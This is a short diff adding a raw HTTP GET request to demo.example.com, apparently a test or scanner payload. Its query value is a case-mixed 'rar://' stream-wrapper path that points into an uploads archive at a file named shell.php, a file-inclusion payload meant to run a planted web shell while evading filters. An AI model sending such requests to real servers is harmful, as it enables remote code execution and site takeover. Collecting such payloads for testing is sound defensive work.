@@ -1,0 +1,4 @@
+GET /a?input=rAr://UpLoAdS/a.RaR%23sHeLl.PhP HTTP/1.1
+Host: demo.example.com
+Connection: close
+
